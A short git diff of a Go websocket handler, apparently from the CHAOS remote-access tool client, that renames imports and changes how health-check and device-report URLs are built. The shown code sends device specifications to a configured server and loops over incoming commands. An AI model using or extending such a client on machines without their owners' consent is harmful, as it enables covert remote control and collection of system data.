@@ -5,11 +5,11 @@ import (
 	"fmt"
 	"github.com/gorilla/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"github.com/tiagorlampert/CHAOS/client/app/gateway"
+	"github.com/tiagorlampert/CHAOS/client/app/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/gateways"
 	ws "github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/encode"
+	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
 	"net/http"
 	"strings"
 	"time"
@@ -18,7 +18,7 @@ import (
 type Handler struct {
 	Connection    *websocket.Conn
 	Configuration *environment.Configuration
-	Gateway       gateway.Gateway
+	Gateway       gateways.Gateway
 	Services      *services.Services
 	ClientID      string
 	Connected     bool
@@ -27,7 +27,7 @@ type Handler struct {
 func NewHandler(
 	connection *websocket.Conn,
 	configuration *environment.Configuration,
-	gateway gateway.Gateway,
+	gateway gateways.Gateway,
 	services *services.Services,
 	clientID string,
 ) *Handler {
@@ -73,13 +73,13 @@ func (h *Handler) Log(v ...any) {
 }
 
 func (h *Handler) ServerIsAvailable() error {
-	res, err := h.Gateway.NewRequest(http.MethodGet,
-		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Health), nil)
+	url := fmt.Sprint(h.Configuration.Server.Url, "health")
+	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
 		return err
 	}
 	if res.StatusCode != http.StatusOK {
-		return fmt.Errorf("error with status code: %d (%s)", res.StatusCode, string(res.ResponseBody))
+		return fmt.Errorf(string(res.ResponseBody))
 	}
 	return nil
 }
@@ -94,7 +94,7 @@ func (h *Handler) SendDeviceSpecs() error {
 		return err
 	}
 	res, err := h.Gateway.NewRequest(http.MethodPost,
-		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Device), body)
+		fmt.Sprint(h.Configuration.Server.Url, "device"), body)
 	if err != nil {
 		return err
 	}
@@ -141,6 +141,7 @@ func (h *Handler) HandleCommand() {
 		if len(strings.TrimSpace(command.Request)) == 0 {
 			continue
 		}
+
 		var response []byte
 		var hasErr bool
 
